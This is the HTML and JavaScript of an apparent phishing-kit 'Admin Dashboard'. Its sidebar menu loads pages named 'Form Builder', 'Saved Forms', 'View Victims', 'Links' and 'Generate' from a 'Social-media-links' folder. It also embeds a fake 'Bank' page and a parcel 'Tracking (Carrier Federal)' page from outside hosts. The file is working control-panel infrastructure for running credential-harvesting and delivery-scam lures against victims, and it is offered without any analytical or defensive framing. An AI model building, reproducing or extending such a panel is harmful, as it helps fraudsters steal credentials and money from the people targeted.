<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Admin Dashboard</title>

<style>
  html, body {
    margin: 0; padding: 0; height: 100%;
    font-family: Arial, sans-serif;
    color: white;
    overflow: hidden;
    background: black;
  }
  #backgroundCanvas {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    z-index: 0;
    pointer-events: none;
    background: black;
  }
  .header {
    background: rgba(0,0,0,0.8);
    color: #0f0;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: relative;
    z-index: 10;
    font-family: monospace;
  }
  .header img { height: 50px; }

  /* Sidebar */
  .sidebar {
    position: fixed;
    top: 70px; left: 0;
    width: 220px;
    height: calc(100% - 70px);
    background: rgba(0,0,0,0.9);
    padding: 15px 10px;
    display: none;
    flex-direction: column;
    gap: 10px;
    z-index: 20;
    font-family: monospace;
    overflow-y: auto;
  }
  .sidebar a {
    color: #0f0;
    text-decoration: none;
    font-weight: bold;
    background: rgba(0,0,0,0.6);
    padding: 10px;
    border-radius: 5px;
    display: block;
    transition: background 0.3s ease;
    cursor: pointer;
  }
  .sidebar a:hover {
    background: rgba(0,255,0,0.3);
  }

  .content {
    margin-top: 70px;
    height: calc(100% - 70px);
    padding: 10px;
    overflow: auto;
    position: relative;
    z-index: 5;
    background: rgba(0,0,0,0.7);
  }

  iframe {
    width: 100%;
    height: 100%;
    border: none;
    background: #111;
  }

  #logoutBtn, #menuBtn {
    background: none;
    border: 1px solid #0f0;
    color: #0f0;
    cursor: pointer;
    font-family: monospace;
    padding: 5px 15px;
    border-radius: 5px;
    transition: background 0.3s ease;
  }
  #logoutBtn:hover, #menuBtn:hover {
    background: #0f0;
    color: black;
  }
</style>
</head>
<body>

<canvas id="backgroundCanvas"></canvas>

<div class="header">
  <button id="menuBtn">‚ò∞ Menu</button>
  <h1>ADMIN DASHBOARD</h1>
  <button id="logoutBtn">Logout</button>
</div>

<!-- Sidebar -->
<div class="sidebar" id="sidebarMenu">
  <a onclick="openPage('form-builder')">üé® Form Builder</a>
  <a onclick="openPage('forms')">üíæ Saved Forms</a>
  <a onclick="openPage('feedback')">üìù Feedback</a>
  <a onclick="openPage('victims')">üß† View Victims</a>
  <a onclick="openPage('members')">üë• Members</a>
  <a onclick="openPage('links')">üîó Links</a>
  <a onclick="openPage('generate')">üßæ Generate</a>
  <a onclick="openPage('bank')">üè¶ Bank</a>
  <a onclick="openPage('tracking')">üì¶ Tracking (Carrier Federal)</a>
</div>

<!-- Main content -->
<div class="content" id="mainContent">
  <h2>Welcome to the Dashboard</h2>
  <p>Select a menu option to load content.</p>
</div>

<script>
  const sidebar = document.getElementById("sidebarMenu");
  const menuBtn = document.getElementById("menuBtn");
  const contentDiv = document.getElementById("mainContent");

  // Toggle sidebar
  menuBtn.addEventListener("click", () => {
    sidebar.style.display = sidebar.style.display === "flex" ? "none" : "flex";
  });

  // Load pages
  function openPage(page) {
    sidebar.style.display = "none";

    const localPages = {
      'form-builder': "Social-media-links/build.html",
      'forms': "Social-media-links/forms.html",
      'feedback': "Social-media-links/feedback.html",
      'victims': "Social-media-links/victims.html",
      'members': "Social-media-links/members.html",
      'links': "Social-media-links/links.html",
      'generate': "Social-media-links/generate.html",
    };

    const iframePages = {
      'bank': "https://bulksms4.github.io/BANKING/",
      'tracking': "https://x-cargo-exprees.web.app/"
    };

    if (localPages[page]) {
      fetch(localPages[page])
        .then(res => {
          if (!res.ok) throw new Error("Page not found");
          return res.text();
        })
        .then(html => {
          contentDiv.innerHTML = html;
        })
        .catch(err => {
          contentDiv.innerHTML = `<h2 style="color:red;">‚ùå ${err.message}</h2>`;
        });
    }
    else if (iframePages[page]) {
      contentDiv.innerHTML = `<iframe src="${iframePages[page]}"></iframe>`;
    }
  }

  /* Matrix Background */
  const canvas = document.getElementById('backgroundCanvas');
  const ctx = canvas.getContext('2d');
  let width, height;
  function resizeCanvas() {
    width = canvas.width = window.innerWidth;
    height = canvas.height = window.innerHeight;
  }
  window.addEventListener('resize', resizeCanvas);
  resizeCanvas();
  const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%';
  const fontSize = 16;
  let columns = Math.floor(width / fontSize);
  const drops = new Array(columns).fill(1);
  function draw() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, width, height);
    ctx.fillStyle = '#0F0';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
      const text = letters.charAt(Math.floor(Math.random() * letters.length));
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      if (drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    }
    requestAnimationFrame(draw);
  }
  draw();
</script>
</body>
</html>
